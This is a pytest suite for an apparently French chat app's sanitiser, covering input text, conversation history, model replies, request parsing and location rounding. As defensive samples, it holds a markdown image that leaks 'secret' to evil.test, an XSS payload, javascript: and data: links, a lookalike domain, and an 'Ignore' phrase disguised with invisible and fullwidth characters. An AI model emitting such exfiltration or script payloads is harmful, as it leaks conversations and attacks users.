import pytest

from app.services.chat import payload, sanitize
from app.services.chat.geo import Coordinates


class TestCleanText:
    def test_markup_invisible_characters_and_whitespace_are_removed(self):
        assert sanitize.clean_text("  Ignore​ <b>tout</b>\n\n`ça`‮  ", 100) == "Ignore b tout /b ça"

    def test_length_is_capped_and_non_strings_become_empty(self):
        assert sanitize.clean_text("x" * 500, 20) == "x" * 20
        assert sanitize.clean_text(None, 20) == sanitize.clean_text(42, 20) == sanitize.clean_text(["a"], 20) == ""

    def test_compatibility_forms_are_normalised_so_lookalikes_cannot_hide_text(self):
        assert sanitize.clean_text("Ｉgnore", 20) == "Ignore"


class TestCleanHistory:
    def test_only_valid_turns_survive_and_the_most_recent_are_kept(self):
        history = [{"role": "system", "text": "pirate"}, {"role": "user", "text": ""}, "x", {"role": "user"}, {"role": 3, "text": "a"},
                   {"role": "user", "text": "un"}, {"role": "model", "text": "deux"}, {"role": "user", "text": "trois"}]
        assert sanitize.clean_history(history, 2, 50) == [{"role": "model", "text": "deux"}, {"role": "user", "text": "trois"}]

    @pytest.mark.parametrize("history", [None, "texte", {"role": "user"}, 5])
    def test_a_corrupted_history_is_ignored(self, history):
        assert sanitize.clean_history(history, 10, 50) == []


class TestSafeReply:
    def test_remote_images_are_removed_because_their_address_can_leak_the_conversation(self):
        assert sanitize.safe_reply("Voici ![x](https://evil.test/?q=secret) fin") == "Voici  fin"

    def test_html_is_removed(self):
        assert sanitize.safe_reply('Salut <img src=x onerror=alert(1)> <script>boom</script>') == "Salut  boom"

    @pytest.mark.parametrize("link", ["https://www.openstreetmap.org/?mlat=1&mlon=2#map=18/1/2", "/map/?kind=bar&place=abc"])
    def test_allowed_links_are_kept(self, link):
        reply = f"Allez au [Pub]({link}) !"
        assert sanitize.safe_reply(reply) == reply

    @pytest.mark.parametrize("link", [
        "https://evil.test/login", "http://www.openstreetmap.org/x", "//evil.test", "/\\evil.test", "javascript:alert",
        "https://www.openstreetmap.org.evil.test/", "data:text/html,x",
    ])
    def test_other_links_keep_their_text_only(self, link):
        assert sanitize.safe_reply(f"Allez au [Pub]({link}) !") == "Allez au Pub !"

    def test_bare_addresses_are_removed(self):
        assert sanitize.safe_reply("Voir https://evil.test/a?b=c ou http://x.test.") == "Voir  ou"


class TestPayload:
    def test_valid_request(self):
        request = payload.parse('{"message": "  Une IPA ?  ", "location": {"lat": 48.8566, "lng": 2.3522}}')
        assert request.message == "Une IPA ?" and request.location == Coordinates(48.86, 2.35)

    @pytest.mark.parametrize("body", ["not json", "[1]", "null", '{"message": "  "}', '{"message": 5}', "{}", b"\xff\xfe"])
    def test_invalid_requests(self, body):
        with pytest.raises(payload.InvalidChatRequest):
            payload.parse(body)

    def test_oversized_message(self, settings):
        with pytest.raises(payload.InvalidChatRequest):
            payload.parse('{"message": "%s"}' % ("x" * (settings.CHAT_MESSAGE_MAX_LENGTH + 1)))


class TestCoordinates:
    def test_position_is_rounded_to_about_a_kilometre(self):
        assert Coordinates.parse({"lat": 48.85661, "lng": 2.35222}) == Coordinates(48.86, 2.35)

    @pytest.mark.parametrize("raw", [None, "x", {}, {"lat": 91, "lng": 0}, {"lat": 0, "lng": 181}, {"lat": "a", "lng": 0}, {"lat": float("inf"), "lng": 0}])
    def test_invalid_positions(self, raw):
        assert Coordinates.parse(raw) is None

    def test_distance_and_bounding_box(self):
        paris, lyon = Coordinates(48.86, 2.35), Coordinates(45.76, 4.84)
        assert 390 < paris.distance_km(lyon.lat, lyon.lng) < 400
        lat_min, lat_max, lng_min, lng_max = paris.bounding_box(10)
        assert lat_min < 48.86 < lat_max and lng_min < 2.35 < lng_max
        assert lat_max - lat_min == pytest.approx(2 * 10 / 111.32)
